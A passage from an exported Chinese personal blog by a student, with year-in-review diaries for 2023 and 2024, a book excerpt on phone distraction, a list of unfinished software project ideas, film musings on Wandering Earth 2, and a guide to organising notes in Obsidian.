29号酷安群线下k70发布会，印象最深的不是手机而是chi哥的发型。 十二月ISC这个月开了几次讲座，有我提议的Linux基础，还有AI那边发起的机器学习概论。质量都不错，场面也挺热闹的。 顺便几次差一点线下了Dimole，不过这孩子好像挺多灾多难的，希望人没事.jpg 然后月初带家里人来学校里逛了回，月中被大一学弟带带大一学弟打了星火杯。 12.15 今年的第一场雪。 12.16 三刷六级，微原实验，以及生日。 12.18 23:59 第一次被地震警报吵醒，希望甘肃同胞平安。 12.19 和好朋友去设了台，算是半个HAM了。 没想到的是西电湖人的落幕带来的是西电冰人的出现，电专学子永远是会整活的。 月底出去跟朋友溜达了一次，圣诞节跟一个未知的朋友交换了礼物，忙了一个月的各种ddl， 12.30 跟同学出去溜达就当提前跨年了。先是和彦在香积寺里边做了一下午的光影猎手，然后和兆廷在师大万科恰了顿饭，时间真快。 月初很忙，月末也忙，忙忙碌碌的一个月。 这篇流水账从28号开始写，到现在也刚好3天了，再过几个小时，人类又要庆祝自己小小的行星绕着恒星走过了一圈。年年如此，未来也将如此。 这个敲了半天的薄膜键盘，是我在高考完那个暑假买的，一个普通的键盘。它连上过我的老台式机，笔记本，以及现在这个松下笔记本，快三年了，它也老了：大部分按键因为写代码的摧残，已经被磨成了白色。左Shift也因为频繁使用，已经卡的吱吱嘎嘎的响。 看着键盘，想想我自己，好像也差不多。本科排课问题的摧残，jwc烂活的摧残，跟甲方搏斗的摧残，在某些方面我也逐渐迟钝起来，行动力也不如从前。似乎高考前那阵子是我行动力最强的时候，一个人凭着兴趣就写了快四千行代码，给自己和朋友们做了个小玩具。或许这也是一种磨损？ 有时候真觉得自己老了，写不动了。不过这两年写的其实也并不少，甚至就那个因为各种原因烂尾的项目，我提交的代码可能都有几万行。相比于几年前，我确实进步了不少：纯粹依靠自己一个人做到的东西，上限越来越高了。特别是视野开拓了不少，现在能用很多学科的知识去解决实际问题了。不过最重要的还是热情，这几年挖过不少坑，甚至还在酷安发过自己编写的应用，给开源社区贡献了一个博客聚合系统的实现，也被收到了水表里边，作为博客星球的后端，在讲座上讲过两次技术相关的内容。竞赛也打了不少，奖也是。 不过，即使面对天堑我也不想停下，因为我就是想做到我想做的事。和自己和解能解决很多问题，但是我不想，只因为我不服这个自己。所以我一次次挑战自己。即使陷入迷惘，也不想停下步伐，因为这比找不到路更可怕。 现在已经是晚上了，冬天的太阳落山早，天已经黑了。舍友一个回家了，一个出去跨年了。宿舍只剩我一个，宿舍空荡荡的，也没开灯。对着空荡荡的Vim敲了半天，心里有种说不上来的孤独。这算不算是一种孤独编程？（笑） 还没感叹完呢，那几个哥们已经在商量着连麦跨年了。白孤独了（x 变的倒是很多，不变的也挺多。至少在外边，还有这些狐朋狗友陪着我，不是吗？ 你好，2024。有什么展望的话，希望明年写流水账的时候，能来点更精彩的。","link":"/2023/12/31/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/2023%E8%BF%99%E4%B8%80%E5%B9%B4/"},{"title":"2024之梦","text":"最近到了做毕设的时间，导师和我联系上之后，就先让我们毕设小组的同学先写一份周为单位的毕设时间安排，同时每周上交周记。 其实换个尺度看时间很有意思，365天来看的话一年很多，52周来看的话一年又不那么多了。 时间就像……不管了，反正不同的切法会有不同的感觉。按半年分，经常会有种转折感和分界感；按四季分，会给时间赋予四季的色彩；按月分，一年就像是12次轮回，每个轮回都会见到不同的人或事；按周分，应该是作为学生最熟悉的尺度了：周内是上课，周末是放松或者实验作业；按天算，那么就是365次充满无穷可能性的轮回——直到一年之末，坍缩为一个确定的未来。 一年的时间，足够发生很多有趣的事情了。 年初和两个同校朋友去了翠华山玩，一人徒步，一人双板，我单板。滑雪时一一边怕的要死一边高速冲下山的感觉挺妙不可言的，行头一整也挺像那么回事。单板学着也挺快，只要会摔会站起来能换刃就行，一个来小时就出新手区了。就是如果最后没有被鱼雷撞飞起来就更好了。 一周之后，和发小闪现去了青岛，开始了为期一周的旅行。详细日志见青岛之旅，实际上不止青岛，还有山东济南和山东淄博（实际上是因为寒冷原因没去威海）。海边就是最大的惊喜，海鸟是最有趣的风景线。冬日的冷洗刷了澄澈的心灵，也洗刷出青岛澄澈的冬日景色，虽然但是还是建议别冬天去北方沿海冷得要死。 二月是新年。去覆雪的秦岭转了一圈，真的很好看。 月初跟同学回各自的高中看了看，顺便小小宣讲了一下泥电，也当是给学弟们加油打气。 还有奶龙这玩意怎么年初就在追我草 之后就是春节了。平平淡淡，无事最好。家里人变少了之后新年也越来越没年味了，还是说是我长大了？或者说，时代终于是变成了这个阶段。之后又是和同学的几次匆忙的小聚，于是，各自所奔赴的未来交错相映，编织出属于我们一代的未来。 今年年初的雪很大，直到二月下旬才开始消融于暖阳之下。2.24，倒数第三次回到了学校，开始了倒数第三个学期。这一学期的体育课选了江可泽民亦可赛艇，确实有效锻炼了身体。最后一学期的体育课吃上了乐跑，以还算不错的身体素质拿下了。也是以这个选择为契机，今年算是正式开始了比较频繁的运动。 三月，上了最喜欢的编译原理，在逐渐收敛的未来间踌躇不定。和遇到的新朋友一起入坑了中二节奏的坑。中下旬，海棠的樱花林开了花，浪摄了不少。顺便整了这个iris.al的域名。因为犹豫错过了Google Summer of Code。因为换新键盘手残+备份失效删了~/不少东西，好在没有什么特别重要的。 四月，生命力回归北方大地。月初在dimole的邀请下，去了西北文化巡展，陪他见到了现如今漫展许多有趣的东西，也是第一次知道了西安地铁还有地上段。一次早起，去学校的各个角落逛了逛，见到了许多平时不会见到的风景，第一次知道了学校还有个不再开放的南门以及那里会刷新卖菜卖水果的小贩。中旬跟同学出去植物园拍照，回看那会的照片，初夏的光影，如梦似幻。顺便见到了一个80+高龄的退休真·老法师，学习到了不少构图经验和摄影思想，算是成了忘年交？ 月中是B测，磨合新的开发技术，flutter+go一个人秒了。以及跟着智能软件实验室的学长做的项目也日渐步入正轨，开发一路顺利。没想到的是这个带我打了不少竞赛的项目居然来年反手帮我拿下学校的竞赛奖励，感谢大自然的馈赠。和同学逛了几回小寨，真就西北秋叶原。 比较曲折地把大创结题了。 月底入坑了葬送的芙莉莲，然后就卡坑里出不去了。 五一回了家，和同学上塬逛了一圈，发现了生活圈之外的风景。回到学校之后，在一个雨夜漫步了校园，清冷，雨声反衬出的静谧，微弱的路灯，甜美的梦。在一个小登的介绍下有幸尝试了一下兵击，真踏马帅。中旬逐渐习惯了跑步，甚至配速心肺也上来了，顺便练的引体也能比较标准地拉起来12个了。服务器很省心，跑各种服务同时作为存储服务器一直挺稳定。 五月中旬看了隔壁西工大的青空祭，有被震撼到。筹备并参与了泥电的晒你祭，顺便做了服务外包的国赛答辩，虽然只有三等奖，但是那天和同学玩的很开心。以及板子替我参与了一整天的引诱区活动，这辈子有了.jpg 这月也三度复刻了西电湖人：赛艇课下水了几回。虽然只有大活小小的人工湖，但是也挺开心的。 哦还有，在泥电大活湖里摸到蚌了： 就到这了.jpg 月底收了辆毕业老哥的山地，然后骑了5个月，陪伴了我近2000公里，见证了西安南郊到宝鸡的山山水水，也为我开启了一片新的旷野。 本来以为2000公里很长的直到我发现有人月跑量都1200km了。 人比人气死人.jpg 六月开幕，练习时长两年半的鸡哥，坠机了。原罪在12700H上，CPU集成南桥，故障率上天。修电脑花了两月，耽误了不少事。骑行主线也开图到昆明池和隔壁西工大长安校区了。月中，送走了20级老登，也意识到明年这时就轮到我们了。 然后某天晚上骑行的时候被路政的隐形外侧凸出水泥路肩给爆了。提醒各位晚上别骑车，注意观察路况 下旬和浪潮和的学长们道了别，聊了聊未来，某天凌晨在操场遇到一群在南操畅聊，已经毕业的学长们，第二天见到了学校的祝福： 今日同风起，归来仍少年 月底好像蜜雪冰城出了那个火了一个夏天的糯香柠檬茶。 和骑行群的群u们第一次也是这学期最后一次骑行活动，见到了223老哥的两次零速摔不过第二次（好像）只有我看到，终归是走上了紧身衣变态的不归路。 暑假开头折腾了一阵子磁带机，给自己的数据盘冷备了一下（然后就没碰过磁带机了qaq） 7月初陪原批哥们吃了kfc的原神联动，各家餐厅还是意料之中的爆满。只能说原这游戏的体量真的下沉到底了。 之后一段时间经常过几天出去骑一圈，不过因为夏天雨多的问题，去了好几回沣峪口都没进去过分水，雨天路况太危险了。不过幸运的是也拍到不少很值得纪念的美景： 夏天雨骑挺爽，但是车估计不怎么爽，洗车也更是不爽。之后有一回被大暴雨硬控到半夜12点多，电闪雷鸣+大风更是上强度。 除去骑车以外，暑假偶尔还游泳跑步，也算是放开玩了。 月底电脑修好了，继续肝了一阵子项目就回家了，但是没想到差点被山洪偷家，好在片区受损情况很轻，就是几公里之外的地方就伤亡惨重了，山洪下来的时候，去地库挪车的人有不少没逃出来的……对于大部分人来说，生命第一，其他的暂且往后排排吧。 顺便和同学聚餐了一回，之后莫名其妙就开始现场开黑猴了。浅试了一下果不其然被卡在虎先锋了（。 暑假回家的时候带上了自行车，顺便和群u一块线下约骑了一波虽然果不其然跟不上人家，于是回学校的时候并没有坐火车，而是骑回学校去虽然对泥电大部分单车佬来说180km这个距离强度也不算太高，毕竟头一回骑长距离也是有点忐忑，好在最后坚持下来了。 连带休息，花了将近12个小时，走过了178公里，晚上9点才到了学校，好在缓了一晚上就差不多恢复了。其实骑长途又无聊又累又危险但是耐不住太想试试了新手别学 暑假还学了学做饭，试着整了整自己设想中的各种料理，结果还不赖。回来头几天还看到小登们军训，感觉比我们老登那会强度大一些。好像那几天军训还出过几个乐子？ 开学。去了米哈游的校招会，和哥们现场抽奖莫名其妙一等奖+二等奖满载而归（？） 之后又拿到了学长送的总裁签名版龙芯开发板，玩了一阵子，贡献了些微资料。参加了小米的校招，但是准备不充分，笔试被刷了。和同学坐了西安新开的云巴，这玩意甚至路过一些地方的时候光电玻璃还会变成不透明的。和骑行群的群u们团练了几次，只能说大火都挺有实力的。 月底的百团大战（社团招新）也吸引到不少新生还有一些老登；捡到一只仓鼠，被同学带回去养了；以及月底，地铁开了，泥电的门禁也变严了。 国庆又骑了一回，就是晚上降温有点大，回去就发烧了。 帮同学装了台机，玩了玩单片机物联网开发，填上了以前留的一个坑。顺便，报了考研，虽然心里早已有了答案，但是机会放在眼前，还是很难不去尝试一次。那段时间想了很久，最终选择将一切交给时间。 10月底，牢林发力了： 现在看来，后续好像也没什么更大的浪花了；或者说，大部分人已经默认或是不再关心后续发展了。 然后10月底又出去骑游了一圈太平峪： 11月初，学校对面也新开了几个店，先是面包店，再是kfc，之后又是兰湘子和霸王茶姬。 赶上好时代了.jpg 海棠餐厅门口还办了暴雪校园行，遗憾的是我的游戏涉猎太浅薄了。这月的昆明池倒是风景不错： 哎我拍的都是些什么玩意.jpg 和pda开发者们一起聚了餐，感谢szgg和他的专辑qaq 月中骑行服到了，不过也没时间了，只去了一趟祥峪。最后在月末抓住最后的时机和哥们出去骑游了一圈其实还去了趟分水但是起晚了没登顶。还有其实今年确实是下了雪的，但是仅限山上： 月底骑行群群u团建测功率，太菜了就没好意思测。 12月初被同学推荐了那个清体小麦茶，有一说一还可以。然后又被原批哥们带去泥电瑞幸整原神联名饮料不是原神你天天联动的吗。 之后？开题报告，毕业设计，考研，每周汇报，错过了开源社区的线下活动，巧合认识了泥电的robomaster战队，电脑又小问题不断了，骑车被学妹撞了，陪小登骑车去了eva线下活动，有幸参加了泥电的新年音乐会，偶遇和西电同龄的教授，祝健康(&gt;v&lt;) 试乘了八号线，rua到了隔壁瓜大的猫猫， 最后，和朋友们一起，一起跨过了2024。 这一年做了很多的梦，见证了许多人和事。去年的愿望是： 希望明年写流水账的时候，能来点更精彩的。 虽然今年大部分时候都陷入了对未来的迷茫中，经常不自觉地逃避，但是同时，那些容纳我心灵的事物，也让我重新审视自己，面对未来。 自然的馈赠（物理），学校创造的条件，同学和朋友们的陪伴，还有奋力（并不）向前的我，让这篇本该是流水账的东西变得有那么些可说的，甚至能配几张图，万幸，感谢。 正如开头所说，对时间使用不同的尺度，你会得到不同的观感：从最大的，到最小的，人们有很多度量时间的单位。为什么呢？时间是绝对的，无论喜怒哀乐悲欢离合，它只是在反复递增，与每一个人的意志并不相干。 因此，人们创造了从小到大的许多时间的度量单位，来延拓人们的认知，试图对抗永恒前进的时时刻刻。每个我们日常使用的单位，或多或少包含着使用者不同的期许：想要明天出去玩，今年过年想要xxx，这周周末一起去xxx，这个月立个小目标，中午吃啥，诸如此类。这些期许穿插在永恒前进的时间长河中，为我们定下人性的锚点，最终使得”我们”成为我们。曾有一些瞬间，我几近溺亡在时间的长河中，是这些锚点让我顺着时间走到了现在。 又是一年循环之始。该说你好吗，2025？新的一年既是轮回，也是前进；此刻，我将愿望托付给未来的自己，希望最终回应我的，不再是一片虚空。","link":"/2024/12/25/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/2024%E4%B9%8B%E6%A2%A6/"},{"title":"Reincarnation","text":"博客修复完毕，再度复活。 其实主要是因为mysql的锅，所以半天都没修好（）现在已经换用hexo，markdown比富文本编辑器高到不知道哪里去了 markdown+LaTex+vim，是个不错的组合 以后写东西鼠标都不用动了 最近会逐步恢复以前的文章，应该不会太久。","link":"/2020/12/16/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/Reincarnation/"},{"title":"书摘：《娱乐至死》","text":"谎言没有被定义成真理，真理也没有被定义成谎言。真正发生的是公众已经适应了没有连贯性的世界，并且已经被娱乐得麻木不仁了。 破碎化的信息，使得在传统的印刷文字中习惯了连贯的上下文的读者需要不停地切换上下文。这使得读者疲于应付无休止的切换。显然，这让信息得不到被处理的精力了。久而久之，当人们开始适应之后，甚至不会再对信息进行思考，而只是单纯地接收并丢弃，并以这种走马观花的感受为乐。这种上下文切换在手机上展现的最为淋漓尽致。手机的通知系统充分调动用户的各种感官提醒人们去查看最新的信息。它很负责，我们几乎不会遗漏一条信息。而代价就是上面所述的切换一天可能会发生更多次，直到我们筋疲力竭为止，我们依然会点亮屏幕，查看最新的通知。我们会感觉自己看到了很多信息，并且也仅限于此。我们不会更深入地思考整理，不仅是没有那个精力，也是因为这些信息太零散了，从通知类到生活小常识，无所不有。这样的无关联信息没有可供思考的语境，也没有思考的余地：就像照片一样，只是一个个事实而已，它们的联系只有同样使用文字同时排版在你的眼前而已。 这些通知可能很重要，会改变我们接下来的行程安排。但是这种突发事件式的通知会打断我们正在做的，无论它是否重要。这对于我们当前的状态是一种毁灭性打击：当我在看书时，弹出了群聊消息。我点开它，并参与了对话。我退出它，重新回到阅读流程中。若只是一次两次还好，次数多了我会直接放弃阅读，开始做其他的事，比如继续进行没什么营养的对话，查看所有的新消息，或者去视频网站消磨时间。 因此，手机最好还是只回归于一个联络工具的功能，而将其他功能交给更专业的设备去完成。比如把阅读交给实体书/电脑，学习交给电脑/平板。笔记可以用电子的，也可以用纸质的。但是在选择前者时，应该确保不要被工具影响工作状态。做笔记时可以开启免打扰模式来确保专注。 现代生活难以离开手机，但是它的副作用之严重不是所有人都能接受。在日常生活中，尽量减少查看消息的次数，通知可以定时查看。例如，在每天的午餐时间看看通知，决定接下来要做的事。特别注意，避免使用手机进行工作。这是因为手机可能导致的注意力和精力大量消耗，这会大大降低工作效率和工作质量。 再往后的内容属于个人任务/时间管理的内容，这里不再赘述。","link":"/2022/12/29/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E4%B9%A6%E6%91%98%EF%BC%9A%E3%80%8A%E5%A8%B1%E4%B9%90%E8%87%B3%E6%AD%BB%E3%80%8B/"},{"title":"又想重构博客了.jpg（","text":"本来吧，是想直接从头开始，重写一个新的版本。结果写到一半发现，还是直接改方便（ 后面打算分离程序和数据，用json存储设置数据，提高灵活性，可维护性之类的。 在写了在写了.jpg（","link":"/2021/07/07/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E5%8F%88%E6%83%B3%E9%87%8D%E6%9E%84%E5%8D%9A%E5%AE%A2%E4%BA%86.jpg%EF%BC%88/"},{"title":"数一数我挖的坑","text":"文件管理器一个有多个目录树系统，有完善的标签分类系统的，界面美观的，支持命令行的文件管理器（主要是之前整理文件那会发牢骚，最后居然整理出来需求了XD） 今天又有了个新点子：文件筛选（支持反向筛选）归根到底，是文件的多种管理方式。同样的文件可以按类别分类，也可以按照所关联的文件（比如工程）来分类。所以不用做个新的，只要在原有基础上加几种文件查看方式就行，没必要再整套目录树出来。几种方式的组合就能让用户组合出来自己的目录树系统。 东方Rep管理器字面意思。支持管理stg的rep。同时支持导出视频（？），查看信息等 写个py脚本+git管理版本就行了 THStudio东方魔改工具箱。基于thtk，更便捷地管理魔改工程。 不用了，直接把reThtkGui改改就行了 thtkWeb用js复刻一遍thtk。或者用其他手段，制作一个在线版的thtk。 没必要了，wasm可以编译。或者thtk-&gt;docker+golang+vue整一套轮询模式处理系统 全平台分布式存储系统起源于我想在A设备上看某pdf，结果发现在B设备上。所以说白了就是网络邻居（×）。不过融合度会比较高。类似于资源池吧？对于安卓设备，就像一个虚拟内存卡一样存在着；对于Windows而言，就以分区的形式存在着。 怎么我对存储的执念这么深啊（ PHP写游戏王某天被基友拉着玩来着（）但是后面见面机会会少很多，所以就想整一个在线版的。主要因为PHP开发神速，所以就选PHP了还是用C#吧，PHP+ws也能做，就是客户端不好整。 至今只写了两行一行都没写（咕） 应该是个训练开发能力的好project。核心很明确，就是构建出来几个核心数据模型，以及各种事件类。剩下的就简单了。另外，这东西适合Unity做，后端倒是可以考虑用Golang完成。这样就类似于原那样的c2s模式。 WiFi摄像机因为一些原因，想做一个局域网摄像头工具，把旧手机当做摄像头，同时还要保证稳定性，降低设备功耗，兼容浏览器查看，支持使用视频接口二次开发监控端软件。 不过咱还没学安卓开发来着（2023.2.2补：已经会了，但是还在鸽 东方时之潭做一个属于自己的多平台stg Unity没时间学了啊啊啊啊啊啊啊 摘录工具捕获复制动作，并将内容保存下来。（好像OneNote有这功能？） 也就是懒人版剪藏功能。可以捕获Windows剪切板事件然后自动处理。想要做的更方便就是快捷键控制剪藏模式开关。 NanoL4G分布式AI作业系统，模仿550系列的功能 后面会慢慢填坑的（确信）","link":"/2021/07/31/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E6%95%B0%E4%B8%80%E6%95%B0%E6%88%91%E6%8C%96%E7%9A%84%E5%9D%91/"},{"title":"流浪地球2观影小记","text":"刚才回想的时候，对2的几个细节有一些猜测。稍微整理一下思路吧。我尽量猜的贴近电影原剧情一点（ 1.2075木星危机后，moss或许已经寄了？ 首先是隔离计划：出现在片尾ed前，内容是把AI全部转移到领航者号国际空间站上，同时AI决策都要经过联合国审核。名义上是转移AI帮助建设，实际感觉有和重要系统（地球发动机控制中心）切割的意图。 因为球2里边，控制中心应该是在建的状态，因为那时（2058）发动机专用网络尚未完成，得依赖互联网根服务器才能并网点火。而且字母也写的很清楚，那个控制中心是临时的。所以这“切割”确实有道理：网络尚未完成，先把moss丢远点防着它再搞事（×）。毕竟周复盘2058一定会疑惑：月1发动机咋炸的。根据周掌握的信息，他可能是有意识切割AI到空间站的。 其次：1的最后领航者号炸的只剩下个休眠仓了 不过有一个问题我想不通，就是2的ed后彩蛋：moss提到了2078氦闪危机，这和我的猜测矛盾。我本身不太能认可时间可逆转的设定 不过向过去用中微子发信我不知道有没有可能，因为在片尾，DUDE中微子实验室于2065年收到了2075木星危机的告警。但是我还是倾向于都是它干的，只不过它提前10年通知了 2.彩蛋情节发生在何时？ 片尾ed一转拆红包（是新年元素（确信））出来2075预告。看背景也有点像空间站。","link":"/2023/02/02/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%832%E8%A7%82%E5%BD%B1%E5%B0%8F%E8%AE%B0/"},{"title":"我的知识库管理折腾记录","text":"当我开始在记事本里写下第一条笔记时，就注定一定会在知识管理的路上渐行渐远。 从笔记到知识管理，这中间并无太大距离。只要构建一个合理的流程，付出一点精力，换来的是一个能让我们终生受益的个人知识系统：也可以称之为“第二大脑”。 0x01.必要性从手机备忘录开始，我开始了最简单的信息记录。其目的一般有以下几个： 常用信息，比如账号密码，常用资源这些，使用频率高 待办清单。日程安排，时间规划时偶尔会用到 记录收集/摘录的信息。通常是专业知识，技能技巧，文学摘录等，其相对而言较为零散 深夜发癫写写随笔，感想总结之类。写这类东西的目的主要还是梳理为主。书写的速度相对较慢，可以给思维留下充足的余裕去周转 其中，1，2是会短期用到/动态更新，实效性相对较短。在完成任务后，它们一般会被直接删除；而4作为思考整理的副产物，一般不太可能直接用上，只有偶尔自我审视的时候才有用。所以，这其中真正需要进行管理的，只有3。因为3是专业性较强的信息，它们是作为知识被记录的。相反，1，2，4那样的信息，充其量只能作为一种提醒。 而3为何要进行管理？因为3是知识。知识只有归于体系，归于思维逻辑才能内化为能力。零散的知识条目只是记忆，它们只能扩大我们的认知范围，于我们的思维并无裨益。相反，过多的信息只会冲刷我们的心智，让其难以集中下来思考。所以，思维的时间应该和学习的时间相平衡，所谓学而不思则罔，思而不学则殆。如今，在信息洪流面前，很少有人能独善其身，大多数人都被大量信息冲刷，逐渐对一切都变得麻木起来。而进行个人知识管理（Personal Knowledge Management,PKM）或许就是应对信息洪流的一个方式。 总结：作为一种思维/思维辅助手段，KPM对于现代生活中的人们而言是十分有必要的。 0x02.入门 个人知识管理(Personal KnowledgeManagement)是一种新的知识管理的理念和方法，能将个人拥有的各种资料、随手可得的信息变成更具价值的知识，最终利于自己的工作、生活。通过对个人知识的管理，人们可以养成良好的学习习惯，增强信息素养，完善自己的专业知识体系，提高自己的能力和竞争力，为实现个人价值和可持续发展打下坚实基础。 摘自MBA智库 个人知识管理可以分为两方面，信息网络和知识系统。通俗的说，就是知识的来源和知识本身。 信息网络架构获取大量信息是个人知识管理的基础。信息网络是影响知识产出品质的第一影响力，它决定了信息收集能力，数据多少和品质好坏。这一般至少包含三个方面的信息网络：人际网络，媒体网络和互联网。 人际网络。面对面交流往往是获取最直接、最深入问题的信息的来源。提高所谓交际圈的质量，我们就有机会学到更多知识。 媒体网络。这种信息具有较强的实效性，其媒介可能是报刊杂志，网络新闻。在自己关注的领域，可以通过订阅一些权威媒体，并对其进行分类和鉴别，来让信息的收集成为系统性的行为，而非随机的、临时性的行为，更不要被算法构造出的信息茧房一叶障目。这方面，可以考虑借助[[RSS]]来形成自己的信息获取渠道。 互联网。首先要明确，APP不是互联网，它们是互联网世界的孤岛。我们应该熟悉搜索引擎的使用，知晓相关资源之所在。充分利用收藏夹来保存有用的信息吧！ 这就是所谓的[[三维信息网络架构]]。 个人知识系统架构有了信息来源之后，就能着手进行管理了。这里的管理，简单来说，我们需要把收集到的知识存储到一定架构的知识库中。这种有效储存有助于未来的快速存取。 对知识分类。这一点应该根据自身需求来确定。划分的原则应该遵循“我需要什么信息，如何最快地找到它”来操作。这可以参考图书馆文献分类方法，不过也无需深究分类学，在实践中摸索出最佳方法即可。从个人角度讲，一般有人际资源，通讯管理，时间管理，网络资源管理，文件档案管理等。 选择合适的知识管理工具。对于上面那几类信息，可以一个软件管理所有信息，也可以不同软件管理不同信息。比如邮件管理，通讯录管理。知识部分，我们可以采用Wiki和博客（BLOG）来管理，也可以用笔记软件来管理。我先放个Obsidian在这，后面讲（ 创建知识库。可以以目录的方式进行管理，一个临时目录来放置刚收集还未整理的信息，一个目录放置结构化的，成体系的知识目录，一个目录放置归档文件。建立完成后，重要的就是能够快速访问了，这可以借助博客来完成。同时要让笔记继续“生长”：持续维护知识库，增加新资源，更新/合并/删除旧资源，完善知识结构。 应用知识。这是至关重要的一点，知识管理的出发点就是解决更多问题，积累就是为了应用，而这又会创造新的知识。传统的归纳演绎有助于这一点，我们可以从体系中归纳出新的规律，再借助实践来验证这规律。也可以对知识演绎，帮助新的实践。这也可以融合进我们日常学习生活中：发现问题，寻找资料，获取知识，归纳演绎，验证结论并尝试解决问题。这种学习能力在如今无比重要。 上面那一大堆都是我看其他博文的笔记。大概总结一下，几个关键点如下： 建立并维护自己的信息渠道 组织自己的知识架构模式 整理，回顾并更新已有知识 应用知识，从而得到新知识/增强掌握 这其中，我会在本篇重点讨论2。 0x03.知识体系架构在学校中，每门课程的学习都是按照一定架构完成的。正因如此，回忆时才能历久弥新。借助[[Obsidian使用笔记|Obsidian-黑曜石]]，我们可以达到这一点。 我之所以选择它，主要是数据安全：数据纯本地存储，不依赖云服务，能防止不必要的损失。毕竟，中国互联网厂商头顶始终悬着内容审查这一达摩克利斯之剑（这学期马原PPT好几个都下不下来就离谱）。而且数据以[[Markdown语法练习|MarkDown]]格式存储在本地，这使得知识库不会被特定软件捆绑。 同时，最重要的一点是这个玩意：[[]] 这是双向链接，能把两篇笔记关键起来，形成一个边。在写一篇笔记的时候，可以借助它把关联的笔记全部标出来。这样就能形成一个网状/树状结构的知识库，能很高效的管理笔记。 关于Obsidian的基本使用，可以看这篇：玩转 Obsidian 02：基础设置篇 - 少数派 (sspai.com)。下面只会涉及较为核心的部分。 以下的超链接使用部分摘自上面的文章。 超链接使用Obsidian 支持多种「超链接语法」，这些功能也是「现代笔记管理」的必备技能。几种常见的语法如下： 双向链接：[[Note Name]] 话题引用：[[Note Name #header]] 别名引用：[[Note Name |Alias]] 嵌入引用：！[[Note Name]] 块引用：[[Note Name ^]] 超链接语法 - 双向链接「双向链接」的语法为[[Note Name]]，在前文中已经简单介绍过它的使用，下边是关于「双向链接」的详细介绍。 「双向链接」指的是在笔记 A 中通过输入 [[笔记 B]] 后，使得笔记 A 和笔记 B 建立了链接关系，如下： 在笔记A 中可以看到它和 [[笔记 B]] 有关系，同时在笔记 A的「预览模式」下，鼠标经过[[笔记 B]] 时，可以弹出笔记 B 的「缩略视图」，同时点击 [[笔记 B]] 后也可以打开笔记 B的编辑页面。 PS：想要看到笔记 B 的「缩略视图」需要开启「Page Preview」插件。 在笔记 B 中可以通过「Backlinks For 笔记B」看到都有哪些笔记和自己建立过「双向链接」。 PS：「Backlinks For 笔记B」的打开方式常用的方法有两种，通过快捷键或者菜单按钮。 超链接语法 - 话题引用在 Obsidian 中，由于 Obsidian 支持 Markdown 标记，我把用 # 标记的内容称为「话题」，如下图，「### English」和「### Chinese」就是两个「话题」： 话题引用的语法是[[Note Name #header]]，即在使用「双向链接」的时候，我们可以在输入的「笔记名称」后边输入笔记中的「话题」，这种「双向链接」的添加方式称为「话题引用」如图： 「话题引用」带来的好处是，当我们在「预览模式」下，鼠标经过「双向链接」时，弹出的「缩略视图」中只展示 #话题 所包含的内容（最新版本不再展示全文），并且点击「双向链接」也会直接跳转到对应的话题所在行。 超链接语法 - 别名引用别名引用的语法是[[Note Name | Alias]]，即在使用「双向链接」的时候，我们可以在输入的「笔记名称」后边输入一个「别名」，这种「双向链接」的添加方式称为「别名引用」。 别名引用带来的好处是，可以更准确的「表述」我们在原笔记中输入「双向链接」时想表达的意思。 超链接语法 - 嵌入引用嵌入引用的语法![[Note Name]]，即在使用「双向链接」的时候，我们可以在「双向链接」前边输入一个!（叹号），这种「双向链接」的添加方式称为「嵌入引用」。 嵌入引用带来的好处是，我们无需跳转，直接在原笔记中查看到被引入的「新笔记」。 超链接语法 - 块引用块引用的语法 [[Note Name ^]] ，既在使用「双向链接」的时候，我们可以在「双向链接」的后边输入 ^ ，此时我们可以将被链接的笔记中的某一行（包括它的从属段落）引入到当前笔记中。这种方式成为「块引用」。 块引用带来的好处是，我们可以将一篇笔记中的「某个段落」引入到当前笔记中，结合「别名引用」更容易帮我们表达它的意思，如图： 通过上面的说明，对于双链的使用应该已经熟悉了。接下来就是笔记库了。 笔记库结构大概可以分为下面几个部分。 临时库。用于存储随手摘录的内容以及灵感 草稿库。专门存放写作中的内容，一篇文章完成后就可将其移动到正式库中 正式库。用于成体系地存放所有知识，会持续内增长，也就是信息的重组和聚合 归档库。用于存放已经确认不会再有变化/失去维护兴趣的内容 临时库可以专门用Obsidian建立一个，也可以用其他地方，比如手机备忘录，浏览器收藏夹，这些都是可用的收集箱。 草稿库就是字面意思，放草稿用的。更准确的说，应该是一切进行中的内容。比如要写一篇关于计算机视觉的介绍文章，就可以在其中起草一篇文章，然后通过剪藏的内容完成写作。 正式库，也是最重要的库。它里面放置的内容应当是写作完成的信息，完整且高内聚低耦合的知识条目。对于其中的内容，我们应当持续维护。这里的维护就好比小根堆大根堆的维护，我们需要确定大多数时候其内容都应该按照树状/网状和其他内容相关联。维护的过程，就是复习和思考的过程。另外，正式库也可以按照自己的需求分为多个库，比如作为我，就会把计算机科学作为单独的一个主库，把数理等基础学科作为另一个单独的主库。这样在复习时，能保证一定的一致性和连贯性。 最后，是归档库。这么说来似乎不太好理解，但是可以类比成我们自己的思维周期：首先是接受零散信息，然后是逐渐组织起来自己的知识体系，然后对于一些不再关心的，过期的记忆，我们会选择把它“遗忘”——也可能是放在我们平时难以想起的地方。这么看来，这种知识管理方式，实际上相当符合我们的认知规律。另外如若接触过GitHub，对于归档（Archive）一词应当不陌生。它一般发生在仓库没有维护必要/维护者失去精力或者兴趣的时候。所以这实际上也可以看作是一种对于精力的节约？ 借助这一套模式，我们可以更有条理地管理我们的毕生知识。 这几个库的管理我都借助Obsidian完成。因为几个目录中的内容并不会重复，我就只是在同一个笔记库中用几个不同的文件夹区分开了。 ![[Screenshot_20221214_003838.jpg]] 下面三个中的img是图片附件文件夹，另外两个忽略。上面四个分别是归档，草稿，剪藏和正式库。 0x04.第二大脑这词就是这软件一直在标榜的。事实上它确实很像一个第二大脑。它可以帮我们高效率地回顾整理知识系统，让思考更有逻辑，更有迹可循。 这部分，我会从我的经验来说说用这个软件如何进行复习和思考。 